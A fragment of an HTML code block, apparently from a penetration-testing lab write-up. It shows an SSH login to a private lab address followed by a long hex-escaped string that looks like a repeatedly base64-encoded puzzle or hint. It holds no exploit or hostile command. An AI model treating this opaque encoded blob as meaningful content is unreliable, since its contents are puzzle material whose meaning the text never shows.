<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# ssh blah@192.168.0.106
</span><span class='line'>
</span><span class='line'><span class="se">\x</span>56<span class="se">\x</span>6d<span class="se">\x</span>30<span class="se">\x</span>77<span class="se">\x</span>64<span class="se">\x</span>32<span class="se">\x</span>51<span class="se">\x</span>79<span class="se">\x</span>55<span class="se">\x</span>58<span class="se">\x</span>6c<span class="se">\x</span>56<span class="se">\x</span>57<span class="se">\x</span>47<span class="se">\x</span>78<span class="se">\x</span>57<span class="se">\x</span>56<span class="se">\x</span>30<span class="se">\x</span>64<span class="se">\x</span>34
</span><span class='line'><span class="se">\x</span>56<span class="se">\x</span>31<span class="se">\x</span>59<span class="se">\x</span>77<span class="se">\x</span>5a<span class="se">\x</span>44<span class="se">\x</span>52<span class="se">\x</span>57<span class="se">\x</span>4d<span class="se">\x</span>56<span class="se">\x</span>6c<span class="se">\x</span>33<span class="se">\x</span>57<span class="se">\x</span>6b<span class="se">\x</span>52<span class="se">\x</span>53<span class="se">\x</span>57<span class="se">\x</span>46<span class="se">\x</span>4a<span class="se">\x</span>74
</span><span class='line'><span class="se">\x</span>65<span class="se">\x</span>46<span class="se">\x</span>5a<span class="se">\x</span>56<span class="se">\x</span>4d<span class="se">\x</span>6a<span class="se">\x</span>41<span class="se">\x</span>31<span class="se">\x</span>56<span class="se">\x</span>6a<span class="se">\x</span>41<span class="se">\x</span>78<span class="se">\x</span>56<span class="se">\x</span>32<span class="se">\x</span>4a<span class="se">\x</span>45<span class="se">\x</span>54<span class="se">\x</span>6c<span class="se">\x</span>68<span class="se">\x</span>68
</span><span class='line'><span class="se">\x</span>4d<span class="se">\x</span>6b<span class="se">\x</span>30<span class="se">\x</span>78<span class="se">\x</span>56<span class="se">\x</span>6d<span class="se">\x</span>70<span class="se">\x</span>4b<span class="se">\x</span>53<span class="se">\x</span>31<span class="se">\x</span>49<span class="se">\x</span>79<span class="se">\x</span>53<span class="se">\x</span>6b<span class="se">\x</span>56<span class="se">\x</span>55<span class="se">\x</span>62<span class="se">\x</span>47<span class="se">\x</span>68<span class="se">\x</span>6f
</span><span class='line'><span class="se">\x</span>54<span class="se">\x</span>56<span class="se">\x</span>68<span class="se">\x</span>43<span class="se">\x</span>55<span class="se">\x</span>56<span class="se">\x</span>5a<span class="se">\x</span>74<span class="se">\x</span>65<span class="se">\x</span>46<span class="se">\x</span>5a<span class="se">\x</span>6c<span class="se">\x</span>52<span class="se">\x</span>6c<span class="se">\x</span>6c<span class="se">\x</span>35<span class="se">\x</span>56<span class="se">\x</span>47<span class="se">\x</span>74<span class="se">\x</span>73
</span><span class='line'><span class="se">\x</span>61<span class="se">\x</span>6c<span class="se">\x</span>4a<span class="se">\x</span>74<span class="se">\x</span>61<span class="se">\x</span>47<span class="se">\x</span>39<span class="se">\x</span>55<span class="se">\x</span>56<span class="se">\x</span>6d<span class="se">\x</span>68<span class="se">\x</span>44<span class="se">\x</span>56<span class="se">\x</span>56<span class="se">\x</span>5a<span class="se">\x</span>61<span class="se">\x</span>63<span class="se">\x</span>56<span class="se">\x</span>46<span class="se">\x</span>74
</span><span class='line'><span class="se">\x</span>52<span class="se">\x</span>6c<span class="se">\x</span>70<span class="se">\x</span>57<span class="se">\x</span>4d<span class="se">\x</span>44<span class="se">\x</span>45<span class="se">\x</span>31<span class="se">\x</span>56<span class="se">\x</span>54<span class="se">\x</span>4a<span class="se">\x</span>30<span class="se">\x</span>56<span class="se">\x</span>31<span class="se">\x</span>5a<span class="se">\x</span>58<span class="se">\x</span>53<span class="se">\x</span>6b<span class="se">\x</span>68<span class="se">\x</span>68
</span><span class='line'><span class="se">\x</span>52<span class="se">\x</span>7a<span class="se">\x</span>6c<span class="se">\x</span>56<span class="se">\x</span>56<span class="se">\x</span>6d<span class="se">\x</span>78<span class="se">\x</span>61<span class="se">\x</span>4d<span class="se">\x</span>31<span class="se">\x</span>5a<span class="se">\x</span>73<span class="se">\x</span>57<span class="se">\x</span>6d<span class="se">\x</span>46<span class="se">\x</span>6b<span class="se">\x</span>52<span class="se">\x</span>30<span class="se">\x</span>35<span class="se">\x</span>47
</span><span class='line'><span class="se">\x</span>57<span class="se">\x</span>6b<span class="se">\x</span>5a<span class="se">\x</span>53<span class="se">\x</span>54<span class="se">\x</span>6d<span class="se">\x</span>46<span class="se">\x</span>36<span class="se">\x</span>52<span class="se">\x</span>54<span class="se">\x</span>46<span class="se">\x</span>57<span class="se">\x</span>56<span class="se">\x</span>45<span class="se">\x</span>6f<span class="se">\x</span>77<span class="se">\x</span>56<span class="se">\x</span>6a<span class="se">\x</span>46<span class="se">\x</span>61
</span><span class='line'><span class="se">\x</span>57<span class="se">\x</span>46<span class="se">\x</span>4e<span class="se">\x</span>72<span class="se">\x</span>61<span class="se">\x</span>47<span class="se">\x</span>68<span class="se">\x</span>53<span class="se">\x</span>65<span class="se">\x</span>6d<span class="se">\x</span>78<span class="se">\x</span>57<span class="se">\x</span>56<span class="se">\x</span>6d<span class="se">\x</span>70<span class="se">\x</span>4f<span class="se">\x</span>54<span class="se">\x</span>30<span class="se">\x</span>30<span class="se">\x</span>78
</span><span class='line'><span class="se">\x</span>63<span class="se">\x</span>46<span class="se">\x</span>5a<span class="se">\x</span>58<span class="se">\x</span>62<span class="se">\x</span>55<span class="se">\x</span>5a<span class="se">\x</span>72<span class="se">\x</span>55<span class="se">\x</span>6a<span class="se">\x</span>41<span class="se">\x</span>31<span class="se">\x</span>52<span class="se">\x</span>31<span class="se">\x</span>64<span class="se">\x</span>72<span class="se">\x</span>57<span class="se">\x</span>6e<span class="se">\x</span>64<span class="se">\x</span>57
</span><span class='line'><span class="se">\x</span>4d<span class="se">\x</span>44<span class="se">\x</span>46<span class="se">\x</span>46<span class="se">\x</span>55<span class="se">\x</span>6c<span class="se">\x</span>52<span class="se">\x</span>47<span class="se">\x</span>56<span class="se">\x</span>31<span class="se">\x</span>5a<span class="se">\x</span>46<span class="se">\x</span>62<span class="se">\x</span>33<span class="se">\x</span>64<span class="se">\x</span>57<span class="se">\x</span>61<span class="se">\x</span>6b<span class="se">\x</span>5a<span class="se">\x</span>68
</span><span class='line'><span class="se">\x</span>56<span class="se">\x</span>30<span class="se">\x</span>5a<span class="se">\x</span>4f<span class="se">\x</span>63<span class="se">\x</span>6d<span class="se">\x</span>46<span class="se">\x</span>48<span class="se">\x</span>61<span class="se">\x</span>46<span class="se">\x</span>4e<span class="se">\x</span>6c<span class="se">\x</span>62<span class="se">\x</span>58<span class="se">\x</span>68<span class="se">\x</span>58<span class="se">\x</span>56<span class="se">\x</span>6d<span class="se">\x</span>30<span class="se">\x</span>78
</span><span class='line'><span class="se">\x</span>4e<span class="se">\x</span>46<span class="se">\x</span>6c<span class="se">\x</span>56<span class="se">\x</span>4d<span class="se">\x</span>48<span class="se">\x</span>68<span class="se">\x</span>58<span class="se">\x</span>62<span class="se">\x</span>6b<span class="se">\x</span>35<span class="se">\x</span>59<span class="se">\x</span>59<span class="se">\x</span>6c<span class="se">\x</span>56<span class="se">\x</span>61<span class="se">\x</span>63<span class="se">\x</span>6c<span class="se">\x</span>56<span class="se">\x</span>71
</span><span class='line'><span class="se">\x</span>51<span class="se">\x</span>54<span class="se">\x</span>46<span class="se">\x</span>53<span class="se">\x</span>4d<span class="se">\x</span>57<span class="se">\x</span>52<span class="se">\x</span>79<span class="se">\x</span>56<span class="se">\x</span>32<span class="se">\x</span>78<span class="se">\x</span>4f<span class="se">\x</span>56<span class="se">\x</span>57<span class="se">\x</span>4a<span class="se">\x</span>56<span class="se">\x</span>63<span class="se">\x</span>45<span class="se">\x</span>64<span class="se">\x</span>5a
</span><span class='line'><span class="se">\x</span>4d<span class="se">\x</span>46<span class="se">\x</span>5a<span class="se">\x</span>33<span class="se">\x</span>56<span class="se">\x</span>6a<span class="se">\x</span>4a<span class="se">\x</span>4b<span class="se">\x</span>56<span class="se">\x</span>56<span class="se">\x</span>4a<span class="se">\x</span>59<span class="se">\x</span>5a<span class="se">\x</span>46<span class="se">\x</span>70<span class="se">\x</span>6c<span class="se">\x</span>61<span class="se">\x</span>33<span class="se">\x</span>42<span class="se">\x</span>49
</span><span class='line'><span class="se">\x</span>56<span class="se">\x</span>6d<span class="se">\x</span>70<span class="se">\x</span>47<span class="se">\x</span>54<span class="se">\x</span>32<span class="se">\x</span>52<span class="se">\x</span>57<span class="se">\x</span>56<span class="se">\x</span>6e<span class="se">\x</span>52<span class="se">\x</span>68<span class="se">\x</span>52<span class="se">\x</span>6b<span class="se">\x</span>35<span class="se">\x</span>73<span class="se">\x</span>59<span class="se">\x</span>6c<span class="se">\x</span>68<span class="se">\x</span>6f
</span><span class='line'><span class="se">\x</span>57<span class="se">\x</span>46<span class="se">\x</span>5a<span class="se">\x</span>74<span class="se">\x</span>4d<span class="se">\x</span>58<span class="se">\x</span>64<span class="se">\x</span>55<span class="se">\x</span>4d<span class="se">\x</span>56<span class="se">\x</span>46<span class="se">\x</span>33<span class="se">\x</span>54<span class="se">\x</span>55<span class="se">\x</span>68<span class="se">\x</span>6f<span class="se">\x</span>61<span class="se">\x</span>6c<span class="se">\x</span>4a<span class="se">\x</span>73
</span><span class='line'><span class="se">\x</span>63<span class="se">\x</span>46<span class="se">\x</span>6c<span class="se">\x</span>5a<span class="se">\x</span>62<span class="se">\x</span>46<span class="se">\x</span>5a<span class="se">\x</span>68<span class="se">\x</span>59<span class="se">\x</span>32<span class="se">\x</span>78<span class="se">\x</span>57<span class="se">\x</span>63<span class="se">\x</span>56<span class="se">\x</span>46<span class="se">\x</span>55<span class="se">\x</span>52<span class="se">\x</span>6c<span class="se">\x</span>4e<span class="se">\x</span>4e
</span><span class='line'><span class="se">\x</span>56<span class="se">\x</span>6c<span class="se">\x</span>59<span class="se">\x</span>31<span class="se">\x</span>56<span class="se">\x</span>46<span class="se">\x</span>5a<span class="se">\x</span>53<span class="se">\x</span>55<span class="se">\x</span>31<span class="se">\x</span>5a<span class="se">\x</span>72<span class="se">\x</span>4d<span class="se">\x</span>58<span class="se">\x</span>4a<span class="se">\x</span>6a<span class="se">\x</span>52<span class="se">\x</span>6d<span class="se">\x</span>68<span class="se">\x</span>57
</span><span class='line'><span class="se">\x</span>54<span class="se">\x</span>57<span class="se">\x</span>35<span class="se">\x</span>53<span class="se">\x</span>4d<span class="se">\x</span>31<span class="se">\x</span>5a<span class="se">\x</span>71<span class="se">\x</span>53<span class="se">\x</span>6b<span class="se">\x</span>74<span class="se">\x</span>57<span class="se">\x</span>56<span class="se">\x</span>6b<span class="se">\x</span>70<span class="se">\x</span>5a<span class="se">\x</span>57<span class="se">\x</span>6b<span class="se">\x</span>5a<span class="se">\x</span>77
</span><span class='line'><span class="se">\x</span>62<span class="se">\x</span>47<span class="se">\x</span>45<span class="se">\x</span>7a<span class="se">\x</span>51<span class="se">\x</span>6b<span class="se">\x</span>6c<span class="se">\x</span>57<span class="se">\x</span>62<span class="se">\x</span>58<span class="se">\x</span>42<span class="se">\x</span>48<span class="se">\x</span>56<span class="se">\x</span>44<span class="se">\x</span>4a<span class="se">\x</span>53<span class="se">\x</span>56<span class="se">\x</span>31<span class="se">\x</span>5a<span class="se">\x</span>75
</span><span class='line'><span class="se">\x</span>55<span class="se">\x</span>6d<span class="se">\x</span>68<span class="se">\x</span>53<span class="se">\x</span>61<span class="se">\x</span>7a<span class="se">\x</span>56<span class="se">\x</span>7a<span class="se">\x</span>57<span class="se">\x</span>57<span class="se">\x</span>78<span class="se">\x</span>6f<span class="se">\x</span>62<span class="se">\x</span>31<span class="se">\x</span>64<span class="se">\x</span>47<span class="se">\x</span>57<span class="se">\x</span>6e<span class="se">\x</span>52<span class="se">\x</span>4e
</span><span class='line'><span class="se">\x</span>53<span class="se">\x</span>47<span class="se">\x</span>68<span class="se">\x</span>50<span class="se">\x</span>55<span class="se">\x</span>6d<span class="se">\x</span>31<span class="se">\x</span>34<span class="se">\x</span>56<span class="se">\x</span>31<span class="se">\x</span>52<span class="se">\x</span>56<span class="se">\x</span>61<span class="se">\x</span>47<span class="se">\x</span>39<span class="se">\x</span>58<span class="se">\x</span>52<span class="se">\x</span>30<span class="se">\x</span>70<span class="se">\x</span>79
</span><span class='line'><span class="se">\x</span>54<span class="se">\x</span>6c<span class="se">\x</span>5a<span class="se">\x</span>73<span class="se">\x</span>57<span class="se">\x</span>6d<span class="se">\x</span>4a<span class="se">\x</span>47<span class="se">\x</span>57<span class="se">\x</span>6d<span class="se">\x</span>68<span class="se">\x</span>5a<span class="se">\x</span>4d<span class="se">\x</span>6e<span class="se">\x</span>68<span class="se">\x</span>58<span class="se">\x</span>59<span class="se">\x</span>7a<span class="se">\x</span>46<span class="se">\x</span>57
</span><span class='line'><span class="se">\x</span>63<span class="se">\x</span>6c<span class="se">\x</span>70<span class="se">\x</span>47<span class="se">\x</span>61<span class="se">\x</span>47<span class="se">\x</span>6c<span class="se">\x</span>53<span class="se">\x</span>4d<span class="se">\x</span>31<span class="se">\x</span>46<span class="se">\x</span>36<span class="se">\x</span>56<span class="se">\x</span>6a<span class="se">\x</span>4a<span class="se">\x</span>30<span class="se">\x</span>55<span class="se">\x</span>31<span class="se">\x</span>55<span class="se">\x</span>78
</span><span class='line'><span class="se">\x</span>57<span class="se">\x</span>6e<span class="se">\x</span>4a<span class="se">\x</span>4e<span class="se">\x</span>57<span class="se">\x</span>45<span class="se">\x</span>70<span class="se">\x</span>71<span class="se">\x</span>55<span class="se">\x</span>6d<span class="se">\x</span>31<span class="se">\x</span>6f<span class="se">\x</span>56<span class="se">\x</span>31<span class="se">\x</span>52<span class="se">\x</span>58<span class="se">\x</span>4e<span class="se">\x</span>56<span class="se">\x</span>4e<span class="se">\x</span>4e
</span><span class='line'><span class="se">\x</span>4d<span class="se">\x</span>56<span class="se">\x</span>70<span class="se">\x</span>78<span class="se">\x</span>55<span class="se">\x</span>32<span class="se">\x</span>74<span class="se">\x</span>30<span class="se">\x</span>56<span class="se">\x</span>31<span class="se">\x</span>5a<span class="se">\x</span>72<span class="se">\x</span>63<span class="se">\x</span>46<span class="se">\x</span>70<span class="se">\x</span>58<span class="se">\x</span>61<span class="se">\x</span>31<span class="se">\x</span>70<span class="se">\x</span>33
</span><span class='line'><span class="se">\x</span>56<span class="se">\x</span>6a<span class="se">\x</span>46<span class="se">\x</span>4b<span class="se">\x</span>56<span class="se">\x</span>32<span class="se">\x</span>4e<span class="se">\x</span>49<span class="se">\x</span>62<span class="se">\x</span>46<span class="se">\x</span>64<span class="se">\x</span>57<span class="se">\x</span>52<span class="se">\x</span>55<span class="se">\x</span>70<span class="se">\x</span>6f<span class="se">\x</span>56<span class="se">\x</span>6b<span class="se">\x</span>52<span class="se">\x</span>4b
</span><span class='line'><span class="se">\x</span>54<span class="se">\x</span>32<span class="se">\x</span>52<span class="se">\x</span>47<span class="se">\x</span>53<span class="se">\x</span>6e<span class="se">\x</span>4a<span class="se">\x</span>61<span class="se">\x</span>52<span class="se">\x</span>6d<span class="se">\x</span>68<span class="se">\x</span>70<span class="se">\x</span>56<span class="se">\x</span>6a<span class="se">\x</span>4e<span class="se">\x</span>6f<span class="se">\x</span>56<span class="se">\x</span>56<span class="se">\x</span>64<span class="se">\x</span>57
</span><span class='line'><span class="se">\x</span>55<span class="se">\x</span>6b<span class="se">\x</span>39<span class="se">\x</span>52<span class="se">\x</span>4d<span class="se">\x</span>57<span class="se">\x</span>52<span class="se">\x</span>48<span class="se">\x</span>56<span class="se">\x</span>32<span class="se">\x</span>35<span class="se">\x</span>53<span class="se">\x</span>54<span class="se">\x</span>6c<span class="se">\x</span>5a<span class="se">\x</span>46<span class="se">\x</span>53<span class="se">\x</span>6c<span class="se">\x</span>68<span class="se">\x</span>55
</span><span class='line'><span class="se">\x</span>56<span class="se">\x</span>33<span class="se">\x</span>68<span class="se">\x</span>48<span class="se">\x</span>54<span class="se">\x</span>6c<span class="se">\x</span>5a<span class="se">\x</span>61<span class="se">\x</span>57<span class="se">\x</span>45<span class="se">\x</span>35<span class="se">\x</span>56<span class="se">\x</span>4f<span class="se">\x</span>56<span class="se">\x</span>68<span class="se">\x</span>53<span class="se">\x</span>4d<span class="se">\x</span>48<span class="se">\x</span>42<span class="se">\x</span>4a
</span><span class='line'><span class="se">\x</span>56<span class="se">\x</span>6c<span class="se">\x</span>64<span class="se">\x</span>34<span class="se">\x</span>63<span class="se">\x</span>31<span class="se">\x</span>64<span class="se">\x</span>74<span class="se">\x</span>53<span class="se">\x</span>6b<span class="se">\x</span>68<span class="se">\x</span>68<span class="se">\x</span>52<span class="se">\x</span>6c<span class="se">\x</span>4a<span class="se">\x</span>58<span class="se">\x</span>54<span class="se">\x</span>55<span class="se">\x</span>5a<span class="se">\x</span>77
</span><span class='line'><span class="se">\x</span>56<span class="se">\x</span>46<span class="se">\x</span>5a<span class="se">\x</span>71<span class="se">\x</span>52<span class="se">\x</span>6e<span class="se">\x</span>64<span class="se">\x</span>53<span class="se">\x</span>4d<span class="se">\x</span>56<span class="se">\x</span>4a<span class="se">\x</span>30<span class="se">\x</span>5a<span class="se">\x</span>55<span class="se">\x</span>64<span class="se">\x</span>73<span class="se">\x</span>55<span class="se">\x</span>32<span class="se">\x</span>4a<span class="se">\x</span>59
</span><span class='line'><span class="se">\x</span>59<span class="se">\x</span>33<span class="se">\x</span>68<span class="se">\x</span>57<span class="se">\x</span>61<span class="se">\x</span>31<span class="se">\x</span>70<span class="se">\x</span>68<span class="se">\x</span>56<span class="se">\x</span>54<span class="se">\x</span>46<span class="se">\x</span>56<span class="se">\x</span>65<span class="se">\x</span>46<span class="se">\x</span>64<span class="se">\x</span>75<span class="se">\x</span>53<span class="se">\x</span>6b<span class="se">\x</span>35<span class="se">\x</span>58
</span><span class='line'><span class="se">\x</span>52<span class="se">\x</span>58<span class="se">\x</span>42<span class="se">\x</span>78<span class="se">\x</span>56<span class="se">\x</span>57<span class="se">\x</span>78<span class="se">\x</span>6b<span class="se">\x</span>4e<span class="se">\x</span>47<span class="se">\x</span>46<span class="se">\x</span>47<span class="se">\x</span>56<span class="se">\x</span>58<span class="se">\x</span>64<span class="se">\x</span>68<span class="se">\x</span>52<span class="se">\x</span>55<span class="se">\x</span>35<span class="se">\x</span>55
</span><span class='line'><span class="se">\x</span>55<span class="se">\x</span>6d<span class="se">\x</span>78<span class="se">\x</span>77<span class="se">\x</span>65<span class="se">\x</span>46<span class="se">\x</span>55<span class="se">\x</span>79<span class="se">\x</span>64<span class="se">\x</span>47<span class="se">\x</span>46<span class="se">\x</span>69<span class="se">\x</span>52<span class="se">\x</span>6c<span class="se">\x</span>70<span class="se">\x</span>7a<span class="se">\x</span>56<span class="se">\x</span>32<span class="se">\x</span>78<span class="se">\x</span>77
</span><span class='line'><span class="se">\x</span>57<span class="se">\x</span>47<span class="se">\x</span>45<span class="se">\x</span>78<span class="se">\x</span>63<span class="se">\x</span>44<span class="se">\x</span>4e<span class="se">\x</span>5a<span class="se">\x</span>61<span class="se">\x</span>32<span class="se">\x</span>52<span class="se">\x</span>47<span class="se">\x</span>5a<span class="se">\x</span>57<span class="se">\x</span>78<span class="se">\x</span>47<span class="se">\x</span>63<span class="se">\x</span>6d<span class="se">\x</span>4a<span class="se">\x</span>47
</span><span class='line'><span class="se">\x</span>5a<span class="se">\x</span>46<span class="se">\x</span>64<span class="se">\x</span>4e<span class="se">\x</span>4d<span class="se">\x</span>45<span class="se">\x</span>70<span class="se">\x</span>4a<span class="se">\x</span>56<span class="se">\x</span>6d<span class="se">\x</span>74<span class="se">\x</span>53<span class="se">\x</span>53<span class="se">\x</span>31<span class="se">\x</span>55<span class="se">\x</span>78<span class="se">\x</span>57<span class="se">\x</span>58<span class="se">\x</span>68<span class="se">\x</span>57
</span><span class='line'><span class="se">\x</span>62<span class="se">\x</span>6c<span class="se">\x</span>5a<span class="se">\x</span>57<span class="se">\x</span>59<span class="se">\x</span>6c<span class="se">\x</span>68<span class="se">\x</span>43<span class="se">\x</span>56<span class="se">\x</span>46<span class="se">\x</span>6c<span class="se">\x</span>72<span class="se">\x</span>56<span class="se">\x</span>6e<span class="se">\x</span>64<span class="se">\x</span>57<span class="se">\x</span>56<span class="se">\x</span>6c<span class="se">\x</span>70<span class="se">\x</span>30
</span><span class='line'><span class="se">\x</span>5a<span class="se">\x</span>55<span class="se">\x</span>63<span class="se">\x</span>35<span class="se">\x</span>55<span class="se">\x</span>6b<span class="se">\x</span>31<span class="se">\x</span>58<span class="se">\x</span>55<span class="se">\x</span>6e<span class="se">\x</span>70<span class="se">\x</span>57<span class="se">\x</span>4d<span class="se">\x</span>6a<span class="se">\x</span>56<span class="se">\x</span>4c<span class="se">\x</span>56<span class="se">\x</span>30<span class="se">\x</span>64<span class="se">\x</span>4b
</span><span class='line'><span class="se">\x</span>53<span class="se">\x</span>46<span class="se">\x</span>56<span class="se">\x</span>74<span class="se">\x</span>4f<span class="se">\x</span>56<span class="se">\x</span>56<span class="se">\x</span>57<span class="se">\x</span>62<span class="se">\x</span>48<span class="se">\x</span>42<span class="se">\x</span>59<span class="se">\x</span>56<span class="se">\x</span>47<span class="se">\x</span>78<span class="se">\x</span>61<span class="se">\x</span>59<span class="se">\x</span>56<span class="se">\x</span>64<span class="se">\x</span>48
</span><span class='line'><span class="se">\x</span>56<span class="se">\x</span>6b<span class="se">\x</span>68<span class="se">\x</span>6b<span class="se">\x</span>52<span class="se">\x</span>32<span class="se">\x</span>68<span class="se">\x</span>70<span class="se">\x</span>55<span class="se">\x</span>6c<span class="se">\x</span>68<span class="se">\x</span>42<span class="se">\x</span>64<span class="se">\x</span>31<span class="se">\x</span>64<span class="se">\x</span>57<span class="se">\x</span>56<span class="se">\x</span>6d<span class="se">\x</span>39<span class="se">\x</span>55
</span><span class='line'><span class="se">\x</span>4d<span class="se">\x</span>56<span class="se">\x</span>70<span class="se">\x</span>30<span class="se">\x</span>55<span class="se">\x</span>6d<span class="se">\x</span>35<span class="se">\x</span>4b<span class="se">\x</span>54<span class="se">\x</span>31<span class="se">\x</span>5a<span class="se">\x</span>73<span class="se">\x</span>53<span class="se">\x</span>6c<span class="se">\x</span>68<span class="se">\x</span>55<span class="se">\x</span>56<span class="se">\x</span>6c<span class="se">\x</span>70<span class="se">\x</span>33
</span><span class='line'><span class="se">\x</span>56<span class="se">\x</span>30<span class="se">\x</span>5a<span class="se">\x</span>72<span class="se">\x</span>65<span class="se">\x</span>46<span class="se">\x</span>64<span class="se">\x</span>72<span class="se">\x</span>64<span class="se">\x</span>47<span class="se">\x</span>70<span class="se">\x</span>69<span class="se">\x</span>56<span class="se">\x</span>6b<span class="se">\x</span>70<span class="se">\x</span>49<span class="se">\x</span>56<span class="se">\x</span>6c<span class="se">\x</span>64<span class="se">\x</span>34
</span><span class='line'><span class="se">\x</span>61<span class="se">\x</span>32<span class="se">\x</span>46<span class="se">\x</span>57<span class="se">\x</span>53<span class="se">\x</span>6e<span class="se">\x</span>52<span class="se">\x</span>50<span class="se">\x</span>56<span class="se">\x</span>45<span class="se">\x</span>35<span class="se">\x</span>58<span class="se">\x</span>54<span class="se">\x</span>57<span class="se">\x</span>35<span class="se">\x</span>6f<span class="se">\x</span>57<span class="se">\x</span>46<span class="se">\x</span>6c<span class="se">\x</span>71
</span><span class='line'><span class="se">\x</span>53<span class="se">\x</span>6b<span class="se">\x</span>5a<span class="se">\x</span>6c<span class="se">\x</span>52<span class="se">\x</span>6d<span class="se">\x</span>52<span class="se">\x</span>5a<span class="se">\x</span>57<span class="se">\x</span>6b<span class="se">\x</span>55<span class="se">\x</span>31<span class="se">\x</span>56<span class="se">\x</span>31<span class="se">\x</span>5a<span class="se">\x</span>73<span class="se">\x</span>63<span class="se">\x</span>46<span class="se">\x</span>56<span class="se">\x</span>58
</span><span class='line'><span class="se">\x</span>56<span class="se">\x</span>33<span class="se">\x</span>52<span class="se">\x</span>72<span class="se">\x</span>56<span class="se">\x</span>54<span class="se">\x</span>46<span class="se">\x</span>73<span class="se">\x</span>56<span class="se">\x</span>31<span class="se">\x</span>56<span class="se">\x</span>73<span class="se">\x</span>57<span class="se">\x</span>6c<span class="se">\x</span>68<span class="se">\x</span>69<span class="se">\x</span>56<span class="se">\x</span>56<span class="se">\x</span>70<span class="se">\x</span>7a
</span><span class='line'><span class="se">\x</span>57<span class="se">\x</span>57<span class="se">\x</span>74<span class="se">\x</span>61<span class="se">\x</span>64<span class="se">\x</span>32<span class="se">\x</span>56<span class="se">\x</span>47<span class="se">\x</span>56<span class="se">\x</span>58<span class="se">\x</span>6c<span class="se">\x</span>6b<span class="se">\x</span>52<span class="se">\x</span>45<span class="se">\x</span>4a<span class="se">\x</span>58<span class="se">\x</span>54<span class="se">\x</span>56<span class="se">\x</span>5a<span class="se">\x</span>77
</span><span class='line'><span class="se">\x</span>65<span class="se">\x</span>56<span class="se">\x</span>59<span class="se">\x</span>79<span class="se">\x</span>65<span class="se">\x</span>48<span class="se">\x</span>64<span class="se">\x</span>58<span class="se">\x</span>62<span class="se">\x</span>46<span class="se">\x</span>70<span class="se">\x</span>58<span class="se">\x</span>59<span class="se">\x</span>30<span class="se">\x</span>68<span class="se">\x</span>4b<span class="se">\x</span>56<span class="se">\x</span>31<span class="se">\x</span>5a<span class="se">\x</span>46
</span><span class='line'><span class="se">\x</span>57<span class="se">\x</span>6b<span class="se">\x</span>78<span class="se">\x</span>57<span class="se">\x</span>4d<span class="se">\x</span>56<span class="se">\x</span>70<span class="se">\x</span>48<span class="se">\x</span>59<span class="se">\x</span>32<span class="se">\x</span>31<span class="se">\x</span>4b<span class="se">\x</span>52<span class="se">\x</span>31<span class="se">\x</span>70<span class="se">\x</span>47<span class="se">\x</span>5a<span class="se">\x</span>45<span class="se">\x</span>35<span class="se">\x</span>4e
</span><span class='line'><span class="se">\x</span>52<span class="se">\x</span>58<span class="se">\x</span>42<span class="se">\x</span>4b<span class="se">\x</span>56<span class="se">\x</span>6d<span class="se">\x</span>31<span class="se">\x</span>30<span class="se">\x</span>55<span class="se">\x</span>31<span class="se">\x</span>4d<span class="se">\x</span>78<span class="se">\x</span>56<span class="se">\x</span>58<span class="se">\x</span>68<span class="se">\x</span>58<span class="se">\x</span>57<span class="se">\x</span>47<span class="se">\x</span>68<span class="se">\x</span>68
</span><span class='line'><span class="se">\x</span>55<span class="se">\x</span>30<span class="se">\x</span>5a<span class="se">\x</span>61<span class="se">\x</span>56<span class="se">\x</span>6c<span class="se">\x</span>6c<span class="se">\x</span>72<span class="se">\x</span>57<span class="se">\x</span>6b<span class="se">\x</span>74<span class="se">\x</span>6a<span class="se">\x</span>52<span class="se">\x</span>6c<span class="se">\x</span>70<span class="se">\x</span>78<span class="se">\x</span>56<span class="se">\x</span>47<span class="se">\x</span>30<span class="se">\x</span>35
</span><span class='line'><span class="se">\x</span>56<span class="se">\x</span>31<span class="se">\x</span>5a<span class="se">\x</span>73<span class="se">\x</span>63<span class="se">\x</span>45<span class="se">\x</span>68<span class="se">\x</span>58<span class="se">\x</span>56<span class="se">\x</span>45<span class="se">\x</span>35<span class="se">\x</span>76<span class="se">\x</span>59<span class="se">\x</span>56<span class="se">\x</span>55<span class="se">\x</span>78<span class="se">\x</span>57<span class="se">\x</span>46<span class="se">\x</span>56<span class="se">\x</span>75
</span><span class='line'><span class="se">\x</span>63<span class="se">\x</span>46<span class="se">\x</span>64<span class="se">\x</span>4e<span class="se">\x</span>56<span class="se">\x</span>32<span class="se">\x</span>68<span class="se">\x</span>32<span class="se">\x</span>56<span class="se">\x</span>31<span class="se">\x</span>5a<span class="se">\x</span>61<span class="se">\x</span>53<span class="se">\x</span>31<span class="se">\x</span>49<span class="se">\x</span>78<span class="se">\x</span>54<span class="se">\x</span>6e<span class="se">\x</span>56<span class="se">\x</span>52
</span><span class='line'><span class="se">\x</span>62<span class="se">\x</span>46<span class="se">\x</span>5a<span class="se">\x</span>58<span class="se">\x</span>54<span class="se">\x</span>54<span class="se">\x</span>46<span class="se">\x</span>4b<span class="se">\x</span>4e<span class="se">\x</span>6c<span class="se">\x</span>5a<span class="se">\x</span>48<span class="se">\x</span>64<span class="se">\x</span>47<span class="se">\x</span>46<span class="se">\x</span>68<span class="se">\x</span>4d<span class="se">\x</span>6b<span class="se">\x</span>35<span class="se">\x</span>7a
</span><span class='line'><span class="se">\x</span>56<span class="se">\x</span>32<span class="se">\x</span>35<span class="se">\x</span>53<span class="se">\x</span>61<span class="se">\x</span>31<span class="se">\x</span>4a<span class="se">\x</span>74<span class="se">\x</span>55<span class="se">\x</span>6e<span class="se">\x</span>42<span class="se">\x</span>57<span class="se">\x</span>62<span class="se">\x</span>47<span class="se">\x</span>68<span class="se">\x</span>44<span class="se">\x</span>54<span class="se">\x</span>6c<span class="se">\x</span>5a<span class="se">\x</span>6b
</span><span class='line'><span class="se">\x</span>56<span class="se">\x</span>56<span class="se">\x</span>46<span class="se">\x</span>74<span class="se">\x</span>52<span class="se">\x</span>6d<span class="se">\x</span>70<span class="se">\x</span>4e<span class="se">\x</span>56<span class="se">\x</span>31<span class="se">\x</span>49<span class="se">\x</span>77<span class="se">\x</span>56<span class="se">\x</span>54<span class="se">\x</span>4a<span class="se">\x</span>30<span class="se">\x</span>61<span class="se">\x</span>31<span class="se">\x</span>64<span class="se">\x</span>48
